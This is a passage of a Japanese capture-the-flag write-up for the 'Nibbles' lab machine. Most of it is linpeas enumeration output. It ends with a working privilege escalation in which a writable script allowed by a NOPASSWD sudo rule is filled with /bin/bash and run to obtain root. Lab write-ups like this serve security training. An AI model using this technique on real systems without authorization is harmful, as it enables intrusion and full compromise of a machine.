CapBnd:  0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37
CapAmb:  0x0000000000000000=


Files with capabilities (limited to 50):
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr = cap_net_raw+ep
/usr/bin/systemd-detect-virt = cap_dac_override,cap_sys_ptrace+ep

╔══════════╣ Checking misconfigurations of ld.so
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#ldso                                                                                                                                                      
/etc/ld.so.conf                                                                                                                                                                                                                             
Content of /etc/ld.so.conf:                                                                                                                                                                                                                 
include /etc/ld.so.conf.d/*.conf

/etc/ld.so.conf.d
  /etc/ld.so.conf.d/fakeroot-x86_64-linux-gnu.conf                                                                                                                                                                                          
  - /usr/lib/x86_64-linux-gnu/libfakeroot                                                                                                                                                                                                   
  /etc/ld.so.conf.d/libc.conf
  - /usr/local/lib                                                                                                                                                                                                                          
  /etc/ld.so.conf.d/x86_64-linux-gnu.conf
  - /lib/x86_64-linux-gnu                                                                                                                                                                                                                   
  - /usr/lib/x86_64-linux-gnu

/etc/ld.so.preload
╔══════════╣ Files (scripts) in /etc/profile.d/                                                                                                                                                                                             
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#profiles-files                                                                                                                                            
total 24                                                                                                                                                                                                                                    
drwxr-xr-x  2 root root 4096 Dec 28  2017 .
drwxr-xr-x 92 root root 4096 Nov 30  2021 ..
-rw-r--r--  1 root root 1557 Apr 14  2016 Z97-byobu.sh
-rw-r--r--  1 root root  580 Nov 30  2017 apps-bin-path.sh
-rw-r--r--  1 root root  663 May 18  2016 bash_completion.sh
-rw-r--r--  1 root root 1003 Dec 29  2015 cedilla-portuguese.sh

╔══════════╣ Permissions in init, init.d, systemd, and rc.d
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#init-initd-systemd-and-rcd                                                                                                                                
                                                                                                                                                                                                                                            
╔══════════╣ AppArmor binary profiles
-rw-r--r-- 1 root root  3310 Apr 12  2016 sbin.dhclient                                                                                                                                                                                     
-rw-r--r-- 1 root root   125 Jun 30  2016 usr.bin.lxc-start
-rw-r--r-- 1 root root  3612 Apr 29  2016 usr.bin.ubuntu-core-launcher
-rw-r--r-- 1 root root   281 Jun 30  2016 usr.lib.lxd.lxd-bridge-proxy
-rw-r--r-- 1 root root 23155 Nov 30  2017 usr.lib.snapd.snap-confine.real
-rw-r--r-- 1 root root  1550 Oct 18  2017 usr.sbin.mysqld
-rw-r--r-- 1 root root  1527 Jan  5  2016 usr.sbin.rsyslogd
-rw-r--r-- 1 root root  1469 Sep  8  2017 usr.sbin.tcpdump

═╣ Hashes inside passwd file? ........... No
═╣ Writable passwd file? ................ No                                                                                                                                                                                                
═╣ Credentials in fstab/mtab? ........... No                                                                                                                                                                                                
═╣ Can I read shadow files? ............. No                                                                                                                                                                                                
═╣ Can I read shadow plists? ............ No                                                                                                                                                                                                
═╣ Can I write shadow plists? ........... No                                                                                                                                                                                                
═╣ Can I read opasswd file? ............. No                                                                                                                                                                                                
═╣ Can I write in network-scripts? ...... No                                                                                                                                                                                                
═╣ Can I read root folder? .............. No                                                                                                                                                                                                
                                                                                                                                                                                                                                            
╔══════════╣ Searching root files in home dirs (limit 30)
/home/                                                                                                                                                                                                                                      
/root/
/var/www
/var/www/html
/var/www/html/index.html

╔══════════╣ Searching folders owned by me containing others files on it (limit 100)
                                                                                                                                                                                                                                            
╔══════════╣ Readable files belonging to root and readable by me but not world readable
                                                                                                                                                                                                                                            
╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 200)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-files                                                                                                                                            
/dev/mqueue                                                                                                                                                                                                                                 
/dev/shm
/home/nibbler
/run/lock
/run/lock/apache2
/tmp
/tmp/.ICE-unix
/tmp/.Test-unix
/tmp/.X11-unix
/tmp/.XIM-unix
/tmp/.font-unix
#)You_can_write_even_more_files_inside_last_directory

/tmp/personal/stuff
/tmp/personal/stuff/monitor.sh
/tmp/tmux-1001
/tmp/zFcA7vKP
/var/crash
/var/crash/.lock
/var/lib/lxcfs/cgroup/memory/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/init.scope/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/-.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/accounts-daemon.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/acpid.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/apache2.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/apparmor.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/apport.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/atd.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/boot.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/console-setup.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/cron.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/dbus.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/dev-Shockerx2dvg-swap_1.swap/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/dev-disk-byx2did-dmx2dnamex2dShockerx2dx2dvgx2dswap_1.swap/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/dev-disk-byx2did-dmx2duuidx2dLVMx2dA8Nf2cf3f9JkrekQJrNARDzwv0j098QCY3Ohk3T8fhG01Olf9I72klADFcrUCqAM.swap/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/dev-disk-byx2duuid-485d4e4ex2da446x2d4c3ex2d8a83x2d46602d7462c0.swap/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/dev-dmx2d1.swap/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/dev-hugepages.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/dev-mapper-Shockerx2dx2dvgx2dswap_1.swap/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/dev-mqueue.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/grub-common.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/ifup@ens192.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/irqbalance.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/iscsid.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/keyboard-setup.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/kmod-static-nodes.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/lvm2-lvmetad.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/lvm2-monitor.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/lxcfs.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/lxd-containers.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/mdadm.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/mysql.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/networking.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/ondemand.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/open-iscsi.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/open-vm-tools.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/polkitd.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/proc-sys-fs-binfmt_misc.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/rc-local.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/resolvconf.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/rsyslog.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/setvtrgb.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/snapd.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/ssh.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/sys-fs-fuse-connections.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/sys-kernel-debug.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/system-getty.slice/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/system-systemdx2dfsck.slice/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-journal-flush.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-journald.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-logind.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-modules-load.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-random-seed.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-remount-fs.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-sysctl.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-timesyncd.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-tmpfiles-setup-dev.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-tmpfiles-setup.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-udev-trigger.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-udevd.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-update-utmp.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-user-sessions.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/ufw.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/unattended-upgrades.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/var-lib-lxcfs.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/user.slice/cgroup.event_control
/var/lib/php/sessions
/var/tmp
/var/www/html/nibbleblog

╔══════════╣ Interesting GROUP writable files (not in Home) (max 200)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-files                                                                                                                                            
  Group nibbler:                                                                                                                                                                                                                            
/var/www/html/nibbleblog                                                                                                                                                                                                                    
/tmp/personal/stuff/monitor.sh



                            ╔═════════════════════════╗
════════════════════════════╣ Other Interesting Files ╠════════════════════════════                                                                                                                                                         
                            ╚═════════════════════════╝                                                                                                                                                                                     
╔══════════╣ .sh files in path
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#scriptbinaries-in-path                                                                                                                                    
/usr/bin/gettext.sh                                                                                                                                                                                                                         

╔══════════╣ Executable files potentially added by user (limit 70)
2025-04-26+09:40:58.4832833990 /var/crash/.lock                                                                                                                                                                                             
2025-04-26+09:39:01.2232866740 /tmp/.icqrzeafiavf
2025-04-26+09:36:29.8632909020 /tmp/zFcA7vKP
2025-04-26+09:35:08.3872931780 /tmp/NVRZLf9Q
2025-04-26+09:34:17.2352946060 /tmp/6QE7pww8
2025-04-26+07:49:20.2914704940 /tmp/.hPaXKsOjq

╔══════════╣ Unexpected in root
/vmlinuz                                                                                                                                                                                                                                    
/vmlinuz.old
/initrd.img.old
/initrd.img

╔══════════╣ Modified interesting files in the last 5mins (limit 100)
/var/log/syslog                                                                                                                                                                                                                             
/var/log/kern.log
/var/log/auth.log
/home/nibbler/.config/lxc/client.key
/home/nibbler/.config/lxc/client.crt
/home/nibbler/.gnupg/gpg.conf
/home/nibbler/.gnupg/trustdb.gpg
/home/nibbler/.gnupg/pubring.gpg


╔══════════╣ Files inside /home/nibbler (limit 20)
total 28                                                                                                                                                                                                                                    
drwxr-xr-x 5 nibbler nibbler 4096 Apr 27 01:57 .
drwxr-xr-x 3 root    root    4096 Dec 10  2017 ..
-rw------- 1 nibbler nibbler    0 Dec 29  2017 .bash_history
drwxr-x--- 3 nibbler nibbler 4096 Apr 27 01:56 .config
drwx------ 2 nibbler nibbler 4096 Apr 27 01:57 .gnupg
drwxrwxr-x 2 nibbler nibbler 4096 Dec 10  2017 .nano
-r-------- 1 nibbler nibbler 1855 Dec 10  2017 personal.zip
-r-------- 1 nibbler nibbler   33 Apr 26 02:34 user.txt

╔══════════╣ Files inside others home (limit 20)
/var/www/html/index.html                                                                                                                                                                                                                    

╔══════════╣ Searching installed mail applications
                                                                                                                                                                                                                                            
╔══════════╣ Mails (limit 50)
                                                                                                                                                                                                                                            
╔══════════╣ Backup folders
drwx------ 2 root root 4096 Dec 10  2017 /etc/lvm/backup                                                                                                                                                                                    
drwxr-xr-x 2 root root 4096 Dec 28  2017 /var/backups
total 648
-rw-r--r-- 1 root root    51200 Dec 28  2017 alternatives.tar.0
-rw-r--r-- 1 root root    10690 Dec 28  2017 apt.extended_states.0
-rw-r--r-- 1 root root     1258 Dec 10  2017 apt.extended_states.1.gz
-rw-r--r-- 1 root root     1269 Dec 10  2017 apt.extended_states.2.gz
-rw-r--r-- 1 root root      744 Sep 22  2017 apt.extended_states.3.gz
-rw-r--r-- 1 root root       11 Sep 22  2017 dpkg.arch.0
-rw-r--r-- 1 root root      437 Sep 22  2017 dpkg.diversions.0
-rw-r--r-- 1 root root      207 Dec 10  2017 dpkg.statoverride.0
-rw-r--r-- 1 root root   553108 Dec 28  2017 dpkg.status.0
-rw------- 1 root root      772 Dec 10  2017 group.bak
-rw------- 1 root shadow    642 Dec 10  2017 gshadow.bak
-rw------- 1 root root     1607 Dec 10  2017 passwd.bak
-rw------- 1 root shadow   1069 Nov 30  2021 shadow.bak


╔══════════╣ Backup files (limited 100)
-rw-r--r-- 1 root root 128 Sep 22  2017 /var/lib/sgml-base/supercatalog.old                                                                                                                                                                 
-rw-r--r-- 1 root root 190058 Jan 18  2017 /usr/src/linux-headers-4.4.0-62-generic/.config.old
-rw-r--r-- 1 root root 0 Jan 18  2017 /usr/src/linux-headers-4.4.0-62-generic/include/config/wm831x/backup.h
-rw-r--r-- 1 root root 0 Jan 18  2017 /usr/src/linux-headers-4.4.0-62-generic/include/config/net/team/mode/activebackup.h
-rw-r--r-- 1 root root 190528 Dec 11  2017 /usr/src/linux-headers-4.4.0-104-generic/.config.old
-rw-r--r-- 1 root root 0 Dec 11  2017 /usr/src/linux-headers-4.4.0-104-generic/include/config/wm831x/backup.h
-rw-r--r-- 1 root root 0 Dec 11  2017 /usr/src/linux-headers-4.4.0-104-generic/include/config/net/team/mode/activebackup.h
-rw-r--r-- 1 root root 190528 Dec  4  2017 /usr/src/linux-headers-4.4.0-103-generic/.config.old
-rw-r--r-- 1 root root 0 Dec  4  2017 /usr/src/linux-headers-4.4.0-103-generic/include/config/wm831x/backup.h
-rw-r--r-- 1 root root 0 Dec  4  2017 /usr/src/linux-headers-4.4.0-103-generic/include/config/net/team/mode/activebackup.h
-rw-r--r-- 1 root root 31600 Feb  9  2017 /usr/lib/open-vm-tools/plugins/vmsvc/libvmbackup.so
-rwxr-xr-x 1 root root 226 Apr 14  2016 /usr/share/byobu/desktop/byobu.desktop.old
-rw-r--r-- 1 root root 298768 Dec 29  2015 /usr/share/doc/manpages/Changes.old.gz
-rw-r--r-- 1 root root 7867 May  6  2015 /usr/share/doc/telnet/README.telnet.old.gz
-rw-r--r-- 1 root root 11358 Dec 28  2017 /usr/share/info/dir.old
-rw-r--r-- 1 root root 665 Apr 16  2016 /usr/share/man/man8/vgcfgbackup.8.gz
-rw-r--r-- 1 root root 8710 Dec 11  2017 /lib/modules/4.4.0-104-generic/kernel/drivers/net/team/team_mode_activebackup.ko
-rw-r--r-- 1 root root 8990 Dec 11  2017 /lib/modules/4.4.0-104-generic/kernel/drivers/power/wm831x_backup.ko
-rw-r--r-- 1 root root 8710 Dec  4  2017 /lib/modules/4.4.0-103-generic/kernel/drivers/net/team/team_mode_activebackup.ko
-rw-r--r-- 1 root root 8990 Dec  4  2017 /lib/modules/4.4.0-103-generic/kernel/drivers/power/wm831x_backup.ko
-rw-r--r-- 1 root root 673 Sep 22  2017 /etc/xml/xml-core.xml.old
-rw-r--r-- 1 root root 610 Sep 22  2017 /etc/xml/catalog.old
-rw-r--r-- 1 root root 20 Apr 15  2016 /etc/vmware-tools/tools.conf.old

╔══════════╣ Searching tables inside readable .db/.sql/.sqlite files (limit 100)
Found /var/lib/lxd/lxd.db: SQLite 3.x database                                                                                                                                                                                              
Found /var/lib/mlocate/mlocate.db: regular file, no read permission

 -> Extracting tables from /var/lib/lxd/lxd.db (limit 20)
                                                                                                                                                                                                                                            
╔══════════╣ Web files?(output limit)
/var/www/:                                                                                                                                                                                                                                  
total 12K
drwxr-xr-x  3 root root 4.0K Dec 10  2017 .
100  140k  14 root root 4.0K Dec 10  2017 ..
drwxr-xr-x  3 root root 4.0K Dec 28  2017 html

/var/www/html:
total 16K
drwxr-xr-x 3 root    root    4.0K Dec 28  2017 .
drwxr-xr-x 3 root    root    4.0K Dec 10  2017 ..

╔══════════╣ All relevant hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)
-rwxrwxrwx 1 root root 0 Apr 26 09:40 /var/crash/.lock                                                                                                                                                                                      
-rw-r--r-- 1 root root 0 Apr 26 02:33 /run/network/.ifstate.lock
-rwxr-xr-x 1 nibbler nibbler 24136 Apr 26 09:39 /tmp/.icqrzeafiavf
-rwxr-xr-x 1 nibbler nibbler 18440 Apr 26 07:49 /tmp/.hPaXKsOjq
-rw-r--r-- 1 root root 1391 Dec 10  2017 /etc/apparmor.d/cache/.features
-rw-r--r-- 1 root root 220 Aug 31  2015 /etc/skel/.bash_logout
-rw------- 1 root root 0 Jul 19  2016 /etc/.pwd.lock

╔══════════╣ Readable files inside /tmp, /var/tmp, /private/tmp, /private/var/at/tmp, /private/var/tmp, and backup folders (limit 70)
-rwxrwxrwx 1 nibbler nibbler 4015 May  8  2015 /tmp/personal/stuff/monitor.sh                                                                                                                                                               
-rwxr-xr-x 1 nibbler nibbler 24136 Apr 26 09:39 /tmp/.icqrzeafiavf
-rwxr-xr-x 1 nibbler nibbler 4714 Apr 26 09:34 /tmp/6QE7pww8
-r-------- 1 nibbler nibbler 1855 Apr 26 04:13 /tmp/personal.zip
-rwxr-xr-x 1 nibbler nibbler 4714 Apr 26 09:35 /tmp/NVRZLf9Q
-rwxr-xr-x 1 nibbler nibbler 18440 Apr 26 07:49 /tmp/.hPaXKsOjq
-rwxr-xr-x 1 nibbler nibbler 4714 Apr 26 09:36 /tmp/zFcA7vKP
-rw-r--r-- 1 root root 51200 Dec 28  2017 /var/backups/alternatives.tar.0
-rw-r--r-- 1 root root 11 Sep 22  2017 /var/backups/dpkg.arch.0

╔══════════╣ Searching passwords in history files
                                                                                                                                                                                                                                            
╔══════════╣ Searching *password* or *credential* files in home (limit 70)
/bin/systemd-ask-password                                                                                                                                                                                                                   
/bin/systemd-tty-ask-password-agent
/etc/pam.d/common-password
/home/nibbler/.config/lxc/client.key
/usr/lib/git-core/git-credential
/usr/lib/git-core/git-credential-cache
/usr/lib/git-core/git-credential-cache--daemon
/usr/lib/git-core/git-credential-store
  #)There are more creds/passwds files in the previous parent folder

/usr/lib/grub/i386-pc/password.mod
/usr/lib/grub/i386-pc/password_pbkdf2.mod
/usr/lib/mysql/plugin/validate_password.so
/usr/share/dns/root.key
/usr/share/doc/git/contrib/credential
/usr/share/doc/git/contrib/credential/gnome-keyring/git-credential-gnome-keyring.c
/usr/share/doc/git/contrib/credential/netrc/git-credential-netrc
/usr/share/doc/git/contrib/credential/osxkeychain/git-credential-osxkeychain.c
/usr/share/doc/git/contrib/credential/wincred/git-credential-wincred.c
/usr/share/locale-langpack/en_AU/LC_MESSAGES/ubuntuone-credentials.mo
/usr/share/locale-langpack/en_GB/LC_MESSAGES/ubuntuone-credentials.mo
/usr/share/man/man1/git-credential-cache--daemon.1.gz
/usr/share/man/man1/git-credential-cache.1.gz
/usr/share/man/man1/git-credential-store.1.gz
/usr/share/man/man1/git-credential.1.gz
  #)There are more creds/passwds files in the previous parent folder

/usr/share/man/man7/gitcredentials.7.gz
/usr/share/man/man8/systemd-ask-password-console.path.8.gz
/usr/share/man/man8/systemd-ask-password-console.service.8.gz
/usr/share/man/man8/systemd-ask-password-wall.path.8.gz
/usr/share/man/man8/systemd-ask-password-wall.service.8.gz
  #)There are more creds/passwds files in the previous parent folder

/usr/share/pam/common-password.md5sums
/var/cache/debconf/passwords.dat
/var/lib/pam/password

╔══════════╣ Checking for TTY (sudo/su) passwords in audit logs
                                                                                                                                                                                                                                            
╔══════════╣ Checking for TTY (sudo/su) passwords in audit logs
                                                                                                                                                                                                                                            
╔══════════╣ Searching passwords inside logs (limit 70)
/var/log/bootstrap.log: base-passwd depends on libc6 (>= 2.8); however:                                                                                                                                                                     
/var/log/bootstrap.log: base-passwd depends on libdebconfclient0 (>= 0.145); however:
/var/log/bootstrap.log:Preparing to unpack .../base-passwd_3.5.39_amd64.deb ...
/var/log/bootstrap.log:Preparing to unpack .../passwd_1%3a4.2-3.1ubuntu5_amd64.deb ...
/var/log/bootstrap.log:Selecting previously unselected package base-passwd.
/var/log/bootstrap.log:Selecting previously unselected package passwd.
/var/log/bootstrap.log:Setting up base-passwd (3.5.39) ...
/var/log/bootstrap.log:Setting up passwd (1:4.2-3.1ubuntu5) ...
/var/log/bootstrap.log:Shadow passwords are now on.
/var/log/bootstrap.log:Unpacking base-passwd (3.5.39) ...
/var/log/bootstrap.log:Unpacking base-passwd (3.5.39) over (3.5.39) ...
/var/log/bootstrap.log:Unpacking passwd (1:4.2-3.1ubuntu5) ...
/var/log/bootstrap.log:dpkg: base-passwd: dependency problems, but configuring anyway as you requested:
/var/log/dpkg.log.1:2016-07-19 20:43:06 configure base-passwd:amd64 3.5.39 3.5.39
/var/log/dpkg.log.1:2016-07-19 20:43:06 install base-passwd:amd64 <none> 3.5.39
/var/log/dpkg.log.1:2016-07-19 20:43:06 status half-configured base-passwd:amd64 3.5.39
/var/log/dpkg.log.1:2016-07-19 20:43:06 status half-installed base-passwd:amd64 3.5.39
/var/log/dpkg.log.1:2016-07-19 20:43:06 status installed base-passwd:amd64 3.5.39
/var/log/dpkg.log.1:2016-07-19 20:43:06 status unpacked base-passwd:amd64 3.5.39
/var/log/dpkg.log.1:2016-07-19 20:43:08 status half-configured base-passwd:amd64 3.5.39
/var/log/dpkg.log.1:2016-07-19 20:43:08 status half-installed base-passwd:amd64 3.5.39
/var/log/dpkg.log.1:2016-07-19 20:43:08 status unpacked base-passwd:amd64 3.5.39
/var/log/dpkg.log.1:2016-07-19 20:43:08 upgrade base-passwd:amd64 3.5.39 3.5.39
/var/log/dpkg.log.1:2016-07-19 20:43:13 install passwd:amd64 <none> 1:4.2-3.1ubuntu5
/var/log/dpkg.log.1:2016-07-19 20:43:13 status half-installed passwd:amd64 1:4.2-3.1ubuntu5
/var/log/dpkg.log.1:2016-07-19 20:43:13 status unpacked passwd:amd64 1:4.2-3.1ubuntu5
/var/log/dpkg.log.1:2016-07-19 20:43:16 configure base-passwd:amd64 3.5.39 <none>
/var/log/dpkg.log.1:2016-07-19 20:43:16 status half-configured base-passwd:amd64 3.5.39
/var/log/dpkg.log.1:2016-07-19 20:43:16 status installed base-passwd:amd64 3.5.39
/var/log/dpkg.log.1:2016-07-19 20:43:16 status unpacked base-passwd:amd64 3.5.39
/var/log/dpkg.log.1:2016-07-19 20:43:21 configure passwd:amd64 1:4.2-3.1ubuntu5 <none>
/var/log/dpkg.log.1:2016-07-19 20:43:21 status half-configured passwd:amd64 1:4.2-3.1ubuntu5
/var/log/dpkg.log.1:2016-07-19 20:43:21 status installed passwd:amd64 1:4.2-3.1ubuntu5
/var/log/dpkg.log.1:2016-07-19 20:43:21 status unpacked passwd:amd64 1:4.2-3.1ubuntu5
/var/log/dpkg.log.1:2017-09-22 12:40:47 status half-configured passwd:amd64 1:4.2-3.1ubuntu5
/var/log/dpkg.log.1:2017-09-22 12:40:47 status half-installed passwd:amd64 1:4.2-3.1ubuntu5
/var/log/dpkg.log.1:2017-09-22 12:40:47 status unpacked passwd:amd64 1:4.2-3.1ubuntu5
/var/log/dpkg.log.1:2017-09-22 12:40:47 status unpacked passwd:amd64 1:4.2-3.1ubuntu5.3
/var/log/dpkg.log.1:2017-09-22 12:40:47 upgrade passwd:amd64 1:4.2-3.1ubuntu5 1:4.2-3.1ubuntu5.3
/var/log/dpkg.log.1:2017-09-22 12:40:48 configure passwd:amd64 1:4.2-3.1ubuntu5.3 <none>
/var/log/dpkg.log.1:2017-09-22 12:40:48 status half-configured passwd:amd64 1:4.2-3.1ubuntu5.3
/var/log/dpkg.log.1:2017-09-22 12:40:48 status installed passwd:amd64 1:4.2-3.1ubuntu5.3
/var/log/dpkg.log.1:2017-09-22 12:40:48 status unpacked passwd:amd64 1:4.2-3.1ubuntu5.3
/var/log/installer/status:Description: Set up users and passw 140k    0     0  92585      0  0:00:01  0:00:01 --:--:-- 92572
0mords                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
                                ╔════════════════╗                                                                                                                                                                                          
════════════════════════════════╣ API Keys Regex ╠════════════════════════════════                                                                                                                                                          
                                ╚════════════════╝                                                                                                                                                                                          
Regexes to search for API keys aren't activated, use param '-r'
```


## STEP 4
どうやらSUDOがあやしい、パスワードなしでroot権限でシェルスクリプトを実行できるらしい
```sh
╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid                                                                                                                                             
Matching Defaults entries for nibbler on Nibbles:                                                                                                                                                                                           
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```
該当のシェルスクリプトは存在しなかったので、作成
bashを実行できるシェルスクリプトを作成、SUDOで実行すると権限昇格成功！
```sh
nibbler@Nibbles:/$ ls /home/nibbler
ls /home/nibbler
personal.zip  user.txt


nibbler@Nibbles:/$ mkdir -p /home/nibbler/personal/stuff
mkdir -p /home/nibbler/personal/stuff


nibbler@Nibbles:/$ echo '# !/bin/bash' > /home/nibbler/personal/stuff/monitor.sh
<!/bin/bash' > /home/nibbler/personal/stuff/monitor.sh


nibbler@Nibbles:/$ echo '/bin/bash' >> /home/nibbler/personal/stuff/monitor.sh
<in/bash' >> /home/nibbler/personal/stuff/monitor.sh


nibbler@Nibbles:/$ cat /home/nibbler/personal/stuff/monitor.sh
cat /home/nibbler/personal/stuff/monitor.sh
# !/bin/bash
/bin/bash


nibbler@Nibbles:/$ ls -l /home/nibbler/personal/stuff/monitor.sh
ls -l /home/nibbler/personal/stuff/monitor.sh
-rw-rw-rw- 1 nibbler nibbler 23 Apr 27 02:20 /home/nibbler/personal/stuff/monitor.sh


nibbler@Nibbles:/$ chmod +x home/nibbler/personal/stuff/monitor.sh
chmod +x home/nibbler/personal/stuff/monitor.sh


nibbler@Nibbles:/$ ls -l /home/nibbler/personal/stuff/monitor.sh
ls -l /home/nibbler/personal/stuff/monitor.sh
-rwxrwxrwx 1 nibbler nibbler 23 Apr 27 02:20 /home/nibbler/personal/stuff/monitor.sh


nibbler@Nibbles:/$ id
id
uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)


nibbler@Nibbles:/$ sudo /home/nibbler/personal/stuff/monitor.sh
sudo /home/nibbler/personal/stuff/monitor.sh


root@Nibbles:/# id
id
uid=0(root) gid=0(root) groups=0(root)
```
